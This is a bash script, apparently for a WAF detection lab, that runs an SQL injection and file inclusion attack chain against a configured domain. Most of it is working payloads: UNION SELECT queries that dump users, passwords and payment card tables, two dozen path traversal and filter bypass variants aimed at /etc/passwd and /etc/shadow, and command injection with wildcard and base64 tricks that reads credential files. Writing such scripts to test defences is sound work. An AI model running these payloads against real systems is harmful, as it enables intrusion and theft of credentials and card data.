#!/bin/bash
# ============================================================
# SQL Injection + LFI Attack Chain — WAF Variant
# (SQL 注入 + LFI 攻击链 — 域名版, 经 WAF)
#
# WARNING: Lab-only attack simulation script.
#          Do NOT run against unauthorized targets.
#
# Prerequisites:
#   - SQLi lab deployed (deploy-91.sh + deploy-92.sh)
#   - WAF domain reachable with valid SSO session cookie
#
# Usage:
#   export WAF_DOMAIN="https://your-waf-domain:port"
#   export WISID_COOKIE="WISID=<your-session-id>"
#   bash attack-domain-waf.sh
#
# Differences from attack.sh (direct IP version):
#   - All requests routed through WAF: -sk -b "$COOKIE"
#   - WAF fully blocks LFI; script attempts 24 bypass techniques
#   - Falls back to CmdI wildcard bypass for sensitive file reads
#
# Covered scenarios: S4 (alert confirmation), S1 (risk identification)
# ============================================================

set -euo pipefail

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../lib/lab-safety.sh"

# ---------- Configuration (override via environment variables) ----------
DOMAIN="${WAF_DOMAIN:-https://waf.lab.example:30443}"
# Authentication is optional for an unprotected lab WAF; when configured, pass
# the operator-provided cookie unchanged to every request.
COOKIE="${WISID_COOKIE:-}"
BASE="${DOMAIN}"
P="/sqli"

lab_require_attack_target "${DOMAIN}"

# ---------- 工具函数 ----------
get_cst() {
    curl -sk -b "$COOKIE" "${BASE}/cmdi/diag.php?tool=ping&host=127.0.0.1;date" 2>/dev/null \
        | grep -oE '[A-Z][a-z]{2} +[A-Z][a-z]{2} +[0-9]+ [0-9]{2}:[0-9]{2}:[0-9]{2} [A-Z]+ [0-9]{4}'
}

H() { curl -sk -b "$COOKIE" -o /dev/null "$@"; }

log_phase() {
    local ts=$(get_cst)
    echo "[$ts] $1"
}

# ============================================================
echo "============================================"
echo "  SQLi + LFI 攻击 (域名 WAF 版)"
echo "============================================"

# ---------- PHASE 1: 正常业务流量 ----------
log_phase "开始"
H "${BASE}${P}/"
H "${BASE}${P}/search.php?q=mouse"
H "${BASE}${P}/search.php?q=keyboard"
H "${BASE}${P}/page.php?tpl=about"
log_phase "P1 正常业务流量"

# ---------- PHASE 2: 侦察 ----------
for path in /admin /wp-admin /phpmyadmin /.git/config /.env /backup.sql /server-status; do
    H "${BASE}${path}"
done
H "${BASE}${P}/search.php?q=test&debug=1"
log_phase "P2 目录枚举+参数探测"

# ---------- PHASE 3: SQLi 渐进攻击 ----------
# 错误触发
H "${BASE}${P}/search.php?q=test'"

# ORDER BY 列数探测
for n in 1 2 3 4; do
    H "${BASE}${P}/search.php?q=test'+ORDER+BY+${n}--+-"
done

# UNION SELECT
H "${BASE}${P}/search.php?q='+UNION+SELECT+1,version(),user()--+-"
H "${BASE}${P}/search.php?q='+UNION+SELECT+1,GROUP_CONCAT(table_name),3+FROM+information_schema.tables+WHERE+table_schema=database()--+-"

# 数据提取
H "${BASE}${P}/search.php?q='+UNION+SELECT+id,username,password+FROM+users--+-"
H "${BASE}${P}/search.php?q='+UNION+SELECT+id,card_number,cvv+FROM+payment_cards--+-"
H "${BASE}${P}/search.php?q='+UNION+SELECT+1,username,password+FROM+credentials--+-"
log_phase "P3 SQLi (报错→列数→UNION→全表提取) WAF全放行"

# ---------- PHASE 4: LFI 尝试 + 全面绕过 ----------
# 经典 ../
H "${BASE}${P}/page.php?tpl=../../../../../etc/passwd"
H "${BASE}${P}/page.php?tpl=../../../../../../etc/passwd"
H "${BASE}${P}/page.php?tpl=../../../../../etc/shadow"

# URL 编码变体
H "${BASE}${P}/page.php?tpl=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
H "${BASE}${P}/page.php?tpl=..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
H "${BASE}${P}/page.php?tpl=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
H "${BASE}${P}/page.php?tpl=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"

# 递归/变形
H "${BASE}${P}/page.php?tpl=....//....//....//....//....//etc/passwd"
H "${BASE}${P}/page.php?tpl=..././..././..././..././..././etc/passwd"
H "${BASE}${P}/page.php?tpl=..;/..;/..;/..;/..;/etc/passwd"
H "${BASE}${P}/page.php?tpl=..%5c..%5c..%5c..%5c..%5cetc%5cpasswd"

# PHP 包装器
H "${BASE}${P}/page.php?tpl=php://filter/convert.base64-encode/resource=/etc/passwd"
H "${BASE}${P}/page.php?tpl=pHp://filter/convert.base64-encode/resource=/etc/passwd"
H "${BASE}${P}/page.php?tpl=file:///etc/passwd"
H "${BASE}${P}/page.php?tpl=php://input"

# 绝对路径/特殊字符
H "${BASE}${P}/page.php?tpl=/etc/passwd"
H "${BASE}${P}/page.php?tpl=/etc/passwd%00"
H "${BASE}${P}/page.php?tpl=..%0a/..%0a/..%0a/..%0a/..%0a/etc/passwd"

# Unicode/overlong UTF-8
H "${BASE}${P}/page.php?tpl=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
H "${BASE}${P}/page.php?tpl=%ef%bc%8e%ef%bc%8e/%ef%bc%8e%ef%bc%8e/%ef%bc%8e%ef%bc%8e/%ef%bc%8e%ef%bc%8e/%ef%bc%8e%ef%bc%8e/etc/passwd"

# 参数污染
H "${BASE}${P}/page.php?tpl=about&tpl=../../../../../etc/passwd"
H "${BASE}${P}/page.php?tpl[]=../../../../../etc/passwd"
H -X POST -d "tpl=../../../../../etc/passwd" "${BASE}${P}/page.php"
log_phase "P4 LFI 24种绕过尝试 → 全部失败 (WAF拦截)"

# ---------- PHASE 5: CmdI 通配符替代 LFI ----------
H "${BASE}/cmdi/diag.php?tool=ping&host=127.0.0.1;cat+/e??/passw?"
H "${BASE}/cmdi/diag.php?tool=ping&host=127.0.0.1;cat+/e??/shado?"
H "${BASE}/cmdi/diag.php?tool=ping&host=127.0.0.1;cat+/e??/os-releas?"
H "${BASE}/cmdi/diag.php?tool=ping&host=127.0.0.1;echo+L2V0Yy9wYXNzd2Q=|base64+-d|xargs+cat"
log_phase "P5 CmdI通配符替代LFI → 绕过成功"

# ---------- PHASE 6: 误报测试 ----------
H "${BASE}${P}/search.php?q=SELECT+brand+keyboard"
H "${BASE}${P}/search.php?q=union+jack+flag+sticker"
H "${BASE}${P}/"
H "${BASE}${P}/search.php?q=monitor"
log_phase "P6 误报测试+收尾"

echo "============================================"
echo "  攻击结束"
echo "============================================"
